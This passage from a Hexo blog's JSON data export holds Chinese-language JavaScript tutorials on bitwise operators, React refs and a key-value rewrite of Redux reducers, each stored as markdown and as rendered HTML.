class=\"code\"><pre><span class=\"line\">result = ~ expression</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> temp = ~<span class=\"number\">5</span>; <span class=\"comment\">// -&gt; -6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 5 转化成二进制 00000000 00000000 00000000 00000101</span></span><br><span class=\"line\"><span class=\"comment\">// -6 转化成二进制 11111111 11111111 11111111 11111010</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>所有一元运算符（如 ~ 运算符）都按照下面的规则来计算表达式的值：</p>\n<ul>\n<li>如果应用于未定义的表达式或 <code>null</code> 表达式，则会引发一个运行时错误。</li>\n<li>将对象转换为字符串。</li>\n<li>如果可能，将字符串转换为数字。否则，将引发运行时错误。</li>\n<li>布尔值被视为数字（如果为 <code>false</code>，则为 <code>0</code>；如果为 <code>true</code>，则为 <code>1</code>）。</li>\n</ul>\n<p>运算符将应用于结果数字。<br><code>~</code> 运算符查看表达式的二进制表示形式的值，并执行位非运算。<br>表达式中的任何一位为 <code>1</code>，则结果中的该位变为 <code>0</code>。表达式中的任何一位为 <code>0</code>，则结果中的该位变为 <code>1</code>。</p>\n<h4 id=\"按位异或运算符\"><a href=\"#按位异或运算符\" class=\"headerlink\" title=\"按位异或运算符 (^)\"></a>按位异或运算符 <code>(^)</code></h4><p>对两个表达式执行按位“异或”运算。</p>\n<p><strong>语法</strong><br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = expression1 ^ expression2</span><br></pre></td></tr></table></figure></p>\n<p><strong>示例</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> result = <span class=\"number\">5</span> ^ <span class=\"number\">12</span>; <span class=\"comment\">// -&gt; 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 5 -&gt; 0101</span></span><br><span class=\"line\"><span class=\"comment\">// 12 -&gt; 1100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 9 -&gt; 1001</span></span><br></pre></td></tr></table></figure>\n<p><strong>解释</strong><br>当且仅当只有一个表达式的某位为 <code>1</code> 时，结果中的该位才为 <code>1</code>。否则，结果中的该位为 <code>0</code>。</p>"},{"title":"React中的ref","date":"2017-06-20T03:25:06.000Z","_content":"\n众所周知，`React` 是一个非常优秀的 `UI-Library`，它将我们**从事件驱动**带入了**数据驱动**的大潮中。在 `React` 中，一般通过修改 `state` 和 `props` 来更新组件。但是**数据驱动**并不意味着我们就完全不需要操作 `DOM` 了， `ref` 就是 `React` 为我们提供操作 `DOM` 的一个方法。\n<!-- more -->\n\n#### 什么时候该使用 `ref` ?\n\n> There are a few good use cases for refs:\n* Managing focus, text selection, or media playback.\n* Triggering imperative animations.\n* Integrating with third-party DOM libraries.\n\n官方给出的对于 `ref` 应该被使用的三种情况。\n\n1. 需要操作 `input` 框的 `focus` 状态、文本的选中、媒体资源回放等。\n2. 触发必要的动画。\n3. 集成了第三方操作 `DOM` 的库。\n\n虽然给出了使用 `ref` 的场景，但是 `React` 还是非常不推荐使用 `ref` 的。\n\n\n#### ref是什么？\n\n`ref` 取自英文单词 `reference`，意为**引用**。在 `React` 中， `ref` 表示对 **组件/DOM** 的真实引用而非在 **虚拟DOM** 中的引用。所以，在通过 `ref` 访问到的 `DOM结构` 和 `组件` 都是已经存在于页面上的。需要注意的是，这里所说的 `组件` 指的是 **有状态的组件——可以被实例化** 而非无状态的组件。引用组件后，可以通过该组件的实例访问其内部的 `state` & `props` & `method`。\n\n#### ref的使用\n\n官方给出了两种 `ref` 的使用方式：\n* 回调函数(推荐)：\n```js\n\nclass Demo extends Component {\n\n    getInput = (ref) => {\n        // 回调函数中的参数 `ref` 就是当前的真实 `DOM`。 \n        console.log(ref)\n\n        this.textInput = ref;\n    }\n\n    focusInput = () => {\n\n        this.textInput.focus()\n    }\n\n    render () {\n        return (\n            <div>\n                <button onClick={this.focusInput}>click</button>\n\n                {/*<input ref={this.getInput()}/>*/}\n                <input ref={ref => this.textInput = ref}/>\n            </div>\n        )\n    }\n}\n```\n\n    **使用回调函数的触发时机**\n\n    * 组件被渲染后，回调参数 `ref` 为input的dom对象\n    * 组件被卸载后，回调参数 `ref` 为null，确保内存不被泄露\n    * `ref` 被改变\n\n* 使用字符串\n\n```js\n\nclass Demo extends Component {\n\n    focusInput = () => {\n\n        this.refs.textInput.focus()\n    }\n\n    render () {\n        return (\n            <div>\n                <button onClick={this.focusInput}>click</button>\n\n                <input ref='textInput'/>\n            </div>\n        )\n    }\n}\n\n\n```\n\n使用字符串时，通过 `this.refs` 访问dom或者组件实例。\n\n#### 结尾\n\n最后，还是要引用官方说的一句话：\n> ** Don’t Overuse Refs **\n\n既然我们选择了使用 `React` 我们就要习惯于使用数据来驱动组件更新，如果还是频繁的使用DOM操作，那和使用 `jQuery` 有什么区别呢？\n\n\n\n\n\n","source":"_posts/React中的ref.md","raw":"---\ntitle: React中的ref\ndate: 2017-06-20 11:25:06\ntags:\n---\n\n众所周知，`React` 是一个非常优秀的 `UI-Library`，它将我们**从事件驱动**带入了**数据驱动**的大潮中。在 `React` 中，一般通过修改 `state` 和 `props` 来更新组件。但是**数据驱动**并不意味着我们就完全不需要操作 `DOM` 了， `ref` 就是 `React` 为我们提供操作 `DOM` 的一个方法。\n<!-- more -->\n\n#### 什么时候该使用 `ref` ?\n\n> There are a few good use cases for refs:\n* Managing focus, text selection, or media playback.\n* Triggering imperative animations.\n* Integrating with third-party DOM libraries.\n\n官方给出的对于 `ref` 应该被使用的三种情况。\n\n1. 需要操作 `input` 框的 `focus` 状态、文本的选中、媒体资源回放等。\n2. 触发必要的动画。\n3. 集成了第三方操作 `DOM` 的库。\n\n虽然给出了使用 `ref` 的场景，但是 `React` 还是非常不推荐使用 `ref` 的。\n\n\n#### ref是什么？\n\n`ref` 取自英文单词 `reference`，意为**引用**。在 `React` 中， `ref` 表示对 **组件/DOM** 的真实引用而非在 **虚拟DOM** 中的引用。所以，在通过 `ref` 访问到的 `DOM结构` 和 `组件` 都是已经存在于页面上的。需要注意的是，这里所说的 `组件` 指的是 **有状态的组件——可以被实例化** 而非无状态的组件。引用组件后，可以通过该组件的实例访问其内部的 `state` & `props` & `method`。\n\n#### ref的使用\n\n官方给出了两种 `ref` 的使用方式：\n* 回调函数(推荐)：\n```js\n\nclass Demo extends Component {\n\n    getInput = (ref) => {\n        // 回调函数中的参数 `ref` 就是当前的真实 `DOM`。 \n        console.log(ref)\n\n        this.textInput = ref;\n    }\n\n    focusInput = () => {\n\n        this.textInput.focus()\n    }\n\n    render () {\n        return (\n            <div>\n                <button onClick={this.focusInput}>click</button>\n\n                {/*<input ref={this.getInput()}/>*/}\n                <input ref={ref => this.textInput = ref}/>\n            </div>\n        )\n    }\n}\n```\n\n    **使用回调函数的触发时机**\n\n    * 组件被渲染后，回调参数 `ref` 为input的dom对象\n    * 组件被卸载后，回调参数 `ref` 为null，确保内存不被泄露\n    * `ref` 被改变\n\n* 使用字符串\n\n```js\n\nclass Demo extends Component {\n\n    focusInput = () => {\n\n        this.refs.textInput.focus()\n    }\n\n    render () {\n        return (\n            <div>\n                <button onClick={this.focusInput}>click</button>\n\n                <input ref='textInput'/>\n            </div>\n        )\n    }\n}\n\n\n```\n\n使用字符串时，通过 `this.refs` 访问dom或者组件实例。\n\n#### 结尾\n\n最后，还是要引用官方说的一句话：\n> ** Don’t Overuse Refs **\n\n既然我们选择了使用 `React` 我们就要习惯于使用数据来驱动组件更新，如果还是频繁的使用DOM操作，那和使用 `jQuery` 有什么区别呢？\n\n\n\n\n\n","slug":"React中的ref","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qe000302vspvmdm2wu","content":"<p>众所周知，<code>React</code> 是一个非常优秀的 <code>UI-Library</code>，它将我们<strong>从事件驱动</strong>带入了<strong>数据驱动</strong>的大潮中。在 <code>React</code> 中，一般通过修改 <code>state</code> 和 <code>props</code> 来更新组件。但是<strong>数据驱动</strong>并不意味着我们就完全不需要操作 <code>DOM</code> 了， <code>ref</code> 就是 <code>React</code> 为我们提供操作 <code>DOM</code> 的一个方法。<br><a id=\"more\"></a></p>\n<h4 id=\"什么时候该使用-ref\"><a href=\"#什么时候该使用-ref\" class=\"headerlink\" title=\"什么时候该使用 ref ?\"></a>什么时候该使用 <code>ref</code> ?</h4><blockquote>\n<p>There are a few good use cases for refs:</p>\n<ul>\n<li>Managing focus, text selection, or media playback.</li>\n<li>Triggering imperative animations.</li>\n<li>Integrating with third-party DOM libraries.</li>\n</ul>\n</blockquote>\n<p>官方给出的对于 <code>ref</code> 应该被使用的三种情况。</p>\n<ol>\n<li>需要操作 <code>input</code> 框的 <code>focus</code> 状态、文本的选中、媒体资源回放等。</li>\n<li>触发必要的动画。</li>\n<li>集成了第三方操作 <code>DOM</code> 的库。</li>\n</ol>\n<p>虽然给出了使用 <code>ref</code> 的场景，但是 <code>React</code> 还是非常不推荐使用 <code>ref</code> 的。</p>\n<h4 id=\"ref是什么？\"><a href=\"#ref是什么？\" class=\"headerlink\" title=\"ref是什么？\"></a>ref是什么？</h4><p><code>ref</code> 取自英文单词 <code>reference</code>，意为<strong>引用</strong>。在 <code>React</code> 中， <code>ref</code> 表示对 <strong>组件/DOM</strong> 的真实引用而非在 <strong>虚拟DOM</strong> 中的引用。所以，在通过 <code>ref</code> 访问到的 <code>DOM结构</code> 和 <code>组件</code> 都是已经存在于页面上的。需要注意的是，这里所说的 <code>组件</code> 指的是 <strong>有状态的组件——可以被实例化</strong> 而非无状态的组件。引用组件后，可以通过该组件的实例访问其内部的 <code>state</code> &amp; <code>props</code> &amp; <code>method</code>。</p>\n<h4 id=\"ref的使用\"><a href=\"#ref的使用\" class=\"headerlink\" title=\"ref的使用\"></a>ref的使用</h4><p>官方给出了两种 <code>ref</code> 的使用方式：</p>\n<ul>\n<li><p>回调函数(推荐)：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    getInput = <span class=\"function\">(<span class=\"params\">ref</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 回调函数中的参数 `ref` 就是当前的真实 `DOM`。 </span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(ref)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.textInput = ref;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    focusInput = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.textInput.focus()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    render () &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div&gt;</span><br><span class=\"line\">                &lt;button onClick=&#123;<span class=\"keyword\">this</span>.focusInput&#125;&gt;click&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">                &#123;/</span>*&lt;input ref=&#123;this.getInput()&#125;/&gt;*/&#125;</span><br><span class=\"line\">                &lt;input ref=&#123;ref =&gt; this.textInput = ref&#125;/&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>  <strong>使用回调函数的触发时机</strong></p>\n<ul>\n<li>组件被渲染后，回调参数 <code>ref</code> 为input的dom对象</li>\n<li>组件被卸载后，回调参数 <code>ref</code> 为null，确保内存不被泄露</li>\n<li><code>ref</code> 被改变</li>\n</ul>\n</li>\n<li><p>使用字符串</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    focusInput = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.refs.textInput.focus()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    render () &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div&gt;</span><br><span class=\"line\">                &lt;button onClick=&#123;<span class=\"keyword\">this</span>.focusInput&#125;&gt;click&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">                &lt;input ref='textInput'/</span>&gt;</span><br><span class=\"line\">            &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        )</span></span><br><span class=\"line\"><span class=\"regexp\">    &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>使用字符串时，通过 <code>this.refs</code> 访问dom或者组件实例。</p>\n<h4 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h4><p>最后，还是要引用官方说的一句话：</p>\n<blockquote>\n<p><strong> Don’t Overuse Refs </strong></p>\n</blockquote>\n<p>既然我们选择了使用 <code>React</code> 我们就要习惯于使用数据来驱动组件更新，如果还是频繁的使用DOM操作，那和使用 <code>jQuery</code> 有什么区别呢？</p>\n","site":{"data":{}},"excerpt":"<p>众所周知，<code>React</code> 是一个非常优秀的 <code>UI-Library</code>，它将我们<strong>从事件驱动</strong>带入了<strong>数据驱动</strong>的大潮中。在 <code>React</code> 中，一般通过修改 <code>state</code> 和 <code>props</code> 来更新组件。但是<strong>数据驱动</strong>并不意味着我们就完全不需要操作 <code>DOM</code> 了， <code>ref</code> 就是 <code>React</code> 为我们提供操作 <code>DOM</code> 的一个方法。<br>","more":"</p>\n<h4 id=\"什么时候该使用-ref\"><a href=\"#什么时候该使用-ref\" class=\"headerlink\" title=\"什么时候该使用 ref ?\"></a>什么时候该使用 <code>ref</code> ?</h4><blockquote>\n<p>There are a few good use cases for refs:</p>\n<ul>\n<li>Managing focus, text selection, or media playback.</li>\n<li>Triggering imperative animations.</li>\n<li>Integrating with third-party DOM libraries.</li>\n</ul>\n</blockquote>\n<p>官方给出的对于 <code>ref</code> 应该被使用的三种情况。</p>\n<ol>\n<li>需要操作 <code>input</code> 框的 <code>focus</code> 状态、文本的选中、媒体资源回放等。</li>\n<li>触发必要的动画。</li>\n<li>集成了第三方操作 <code>DOM</code> 的库。</li>\n</ol>\n<p>虽然给出了使用 <code>ref</code> 的场景，但是 <code>React</code> 还是非常不推荐使用 <code>ref</code> 的。</p>\n<h4 id=\"ref是什么？\"><a href=\"#ref是什么？\" class=\"headerlink\" title=\"ref是什么？\"></a>ref是什么？</h4><p><code>ref</code> 取自英文单词 <code>reference</code>，意为<strong>引用</strong>。在 <code>React</code> 中， <code>ref</code> 表示对 <strong>组件/DOM</strong> 的真实引用而非在 <strong>虚拟DOM</strong> 中的引用。所以，在通过 <code>ref</code> 访问到的 <code>DOM结构</code> 和 <code>组件</code> 都是已经存在于页面上的。需要注意的是，这里所说的 <code>组件</code> 指的是 <strong>有状态的组件——可以被实例化</strong> 而非无状态的组件。引用组件后，可以通过该组件的实例访问其内部的 <code>state</code> &amp; <code>props</code> &amp; <code>method</code>。</p>\n<h4 id=\"ref的使用\"><a href=\"#ref的使用\" class=\"headerlink\" title=\"ref的使用\"></a>ref的使用</h4><p>官方给出了两种 <code>ref</code> 的使用方式：</p>\n<ul>\n<li><p>回调函数(推荐)：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    getInput = <span class=\"function\">(<span class=\"params\">ref</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 回调函数中的参数 `ref` 就是当前的真实 `DOM`。 </span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(ref)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.textInput = ref;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    focusInput = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.textInput.focus()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    render () &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div&gt;</span><br><span class=\"line\">                &lt;button onClick=&#123;<span class=\"keyword\">this</span>.focusInput&#125;&gt;click&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">                &#123;/</span>*&lt;input ref=&#123;this.getInput()&#125;/&gt;*/&#125;</span><br><span class=\"line\">                &lt;input ref=&#123;ref =&gt; this.textInput = ref&#125;/&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>  <strong>使用回调函数的触发时机</strong></p>\n<ul>\n<li>组件被渲染后，回调参数 <code>ref</code> 为input的dom对象</li>\n<li>组件被卸载后，回调参数 <code>ref</code> 为null，确保内存不被泄露</li>\n<li><code>ref</code> 被改变</li>\n</ul>\n</li>\n<li><p>使用字符串</p>\n</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    focusInput = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.refs.textInput.focus()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    render () &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (</span><br><span class=\"line\">            &lt;div&gt;</span><br><span class=\"line\">                &lt;button onClick=&#123;<span class=\"keyword\">this</span>.focusInput&#125;&gt;click&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">                &lt;input ref='textInput'/</span>&gt;</span><br><span class=\"line\">            &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        )</span></span><br><span class=\"line\"><span class=\"regexp\">    &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>使用字符串时，通过 <code>this.refs</code> 访问dom或者组件实例。</p>\n<h4 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h4><p>最后，还是要引用官方说的一句话：</p>\n<blockquote>\n<p><strong> Don’t Overuse Refs </strong></p>\n</blockquote>\n<p>既然我们选择了使用 <code>React</code> 我们就要习惯于使用数据来驱动组件更新，如果还是频繁的使用DOM操作，那和使用 <code>jQuery</code> 有什么区别呢？</p>"},{"title":"Redux-reducer的优化写法","date":"2017-05-12T09:25:43.000Z","_content":"\n本文介绍如何摆脱 `switch-case`，以一种更方便的形式接收 `action` 的通知。\n<!-- more -->\n\n### 前言\n`redux` 是 `react` 数据管理的一个解决方案，其原理借鉴了 `flux` 架构。`redux` 中一共由三个核心部分构成--`store`、`reducer`、`action`，其中 `reducer` 则是负责接收 `action` 的消息，然后对数据部分进行处理。官方对于 `reducer` 的描述为一个简单的 `switch-case` 结构。下面会介绍 `reducer` 以一种 `key-value` 的形式接收 `action`。\n\n### 旧版 `switch-case` 写法\n\n下面是伪代码：\n\n```js\nimport {xxx} from 'constants';\n\n// action\nexport const actionHandler = () => {\n    return {\n        type: xxx,\n        //...\n    }\n}\n```\n\n```js\nimport {xxx, yyy} from 'constants';\n\nconst initialState = {\n\n}\n\n// reducer\nexport const Model = (state = initialState, action) => {\n    switch(action.type) {\n        case xxx: \n            return //...\n        case yyy:\n            return //...\n\n        default:\n            return state;\n    }\n}\n```\n\n上面的这种写法并不能说是错，因为官方给出的例子就是这么介绍的。但是就好比 `javascript loop` 一样，大家都在用 `forEach`、`for-of`了，而我们还是在使用 `for` 循环。而且 `switch-case` 就如同循环一般，如果找不到匹配项就会一直向下查找，性能方面不是特别好(我真不想说这句话)。\n\n### 重写 `reducer`\n\n简单的说，`reducer` 是为了接收一个 `action.type` 并对数据进行相应的处理，然后返回。\n\n```js\nfunction reducer (state = initialState, action){\n    // 处理 action，返回 {}\n}\n\n```\n\n我们可以将 `action.type` 更 `reducer` 合并：\n\n```js\nfunction reducer (state = initialState, action){\n    return () => (\n        {\n            [action.type]: (state, action) => {\n\n            }\n        }\n    )\n}\n```\n\n现在 `reducer` 还是接收 `action.type` 然后触发相应的数据处理函数。只不过从 `switch-case` 变成了 `key-value` 取值的形式。\n---\n\n最终，我们对上面的代码进行优化：\n\n```js\n// createReducer\nexport  default function (initialState, reducerMap) {\n\n    return (state = initialState, action) => {\n\n        const reducer = reducerMap[action.type];\n        return reducer ? reducer(state, action) : state;\n    \n    };\n\n}\n```\n\n上面的最终版还是有一点问题，这里我再优化了，留给有心的人去解决。\n","source":"_posts/Redux-reducer的优化写法.md","raw":"---\ntitle: Redux-reducer的优化写法\ndate: 2017-05-12 17:25:43\ntags:\n---\n\n本文介绍如何摆脱 `switch-case`，以一种更方便的形式接收 `action` 的通知。\n<!-- more -->\n\n### 前言\n`redux` 是 `react` 数据管理的一个解决方案，其原理借鉴了 `flux` 架构。`redux` 中一共由三个核心部分构成--`store`、`reducer`、`action`，其中 `reducer` 则是负责接收 `action` 的消息，然后对数据部分进行处理。官方对于 `reducer` 的描述为一个简单的 `switch-case` 结构。下面会介绍 `reducer` 以一种 `key-value` 的形式接收 `action`。\n\n### 旧版 `switch-case` 写法\n\n下面是伪代码：\n\n```js\nimport {xxx} from 'constants';\n\n// action\nexport const actionHandler = () => {\n    return {\n        type: xxx,\n        //...\n    }\n}\n```\n\n```js\nimport {xxx, yyy} from 'constants';\n\nconst initialState = {\n\n}\n\n// reducer\nexport const Model = (state = initialState, action) => {\n    switch(action.type) {\n        case xxx: \n            return //...\n        case yyy:\n            return //...\n\n        default:\n            return state;\n    }\n}\n```\n\n上面的这种写法并不能说是错，因为官方给出的例子就是这么介绍的。但是就好比 `javascript loop` 一样，大家都在用 `forEach`、`for-of`了，而我们还是在使用 `for` 循环。而且 `switch-case` 就如同循环一般，如果找不到匹配项就会一直向下查找，性能方面不是特别好(我真不想说这句话)。\n\n### 重写 `reducer`\n\n简单的说，`reducer` 是为了接收一个 `action.type` 并对数据进行相应的处理，然后返回。\n\n```js\nfunction reducer (state = initialState, action){\n    // 处理 action，返回 {}\n}\n\n```\n\n我们可以将 `action.type` 更 `reducer` 合并：\n\n```js\nfunction reducer (state = initialState, action){\n    return () => (\n        {\n            [action.type]: (state, action) => {\n\n            }\n        }\n    )\n}\n```\n\n现在 `reducer` 还是接收 `action.type` 然后触发相应的数据处理函数。只不过从 `switch-case` 变成了 `key-value` 取值的形式。\n---\n\n最终，我们对上面的代码进行优化：\n\n```js\n// createReducer\nexport  default function (initialState, reducerMap) {\n\n    return (state = initialState, action) => {\n\n        const reducer = reducerMap[action.type];\n        return reducer ? reducer(state, action) : state;\n    \n    };\n\n}\n```\n\n上面的最终版还是有一点问题，这里我再优化了，留给有心的人去解决。\n","slug":"Redux-reducer的优化写法","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qf000402vsjanioljn","content":"<p>本文介绍如何摆脱 <code>switch-case</code>，以一种更方便的形式接收 <code>action</code> 的通知。<br><a id=\"more\"></a></p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p><code>redux</code> 是 <code>react</code> 数据管理的一个解决方案，其原理借鉴了 <code>flux</code> 架构。<code>redux</code> 中一共由三个核心部分构成–<code>store</code>、<code>reducer</code>、<code>action</code>，其中 <code>reducer</code> 则是负责接收 <code>action</code> 的消息，然后对数据部分进行处理。官方对于 <code>reducer</code> 的描述为一个简单的 <code>switch-case</code> 结构。下面会介绍 <code>reducer</code> 以一种 <code>key-value</code> 的形式接收 <code>action</code>。</p>\n<h3 id=\"旧版-switch-case-写法\"><a href=\"#旧版-switch-case-写法\" class=\"headerlink\" title=\"旧版 switch-case 写法\"></a>旧版 <code>switch-case</code> 写法</h3><p>下面是伪代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;xxx&#125; <span class=\"keyword\">from</span> <span class=\"string\">'constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// action</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> actionHandler = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        type: xxx,</span><br><span class=\"line\">        <span class=\"comment\">//...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 